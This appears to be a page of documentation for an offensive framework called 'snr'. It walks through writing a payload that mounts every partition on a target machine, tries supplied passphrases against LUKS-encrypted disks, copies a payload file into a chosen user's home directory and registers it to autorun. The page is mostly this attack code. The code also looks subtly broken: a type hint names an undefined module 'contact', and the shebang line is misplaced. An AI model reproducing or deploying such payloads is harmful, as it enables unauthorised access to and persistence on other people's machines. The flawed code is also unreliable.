Working Example
-------

After knowing all you need to know, let's give you a working example:

`my_payload/__init__.py`:

.. code-block:: python

    """
    Add a payload to a user's home directory
    """
    from snr.core.payload.payload import Context, Payload


    class MyPayload(Payload):
        AUTHORS = ("GlobularOne",)
        TARGET_OS_LIST = ("GNU/Linux",)
        INPUTS = (
            ("USERNAME", "", -1, "Username of the user to add the payload to their home directory "),
            ("PASSPHRASES", [], -1, "Passphrases to try for LUKS-encrypted partitions"),
        )

        def generate(self, ctx: Context) -> int:
            variables = self.get_self_variables()
            self.format_payload_and_write(ctx, variables)
            self.add_autorun(ctx)
            return 0

    payload = MyPayload()

`my_payload/payload.py`:

.. code-block:: python

    """
    My_payload Payload
    """
    #!/usr/bin/python3
    from snr.core.payload import entry_point, storage, context

    USERNAME = "@USERNAME@"
    PASSPHRASES = "@PASSPHRASES@"

    @entry_point.entry_point
    def main(block_info: list[storage.BlockInfo], root_ctx: contact.Context, our_device: str) -> None:
        for part in storage.query_all_partitions(block_info):
            with storage.mount_partition(part, PASSPHRASES) as mounted_part:
                if mounted_part.is_linux():
                    mounted_part.copy("/root/payload.py", f"/home/{USERNAME}/payload.py")

.. seealso::

    :doc:`partition_type`
        Read about how the partition type detection works and how you can use it.
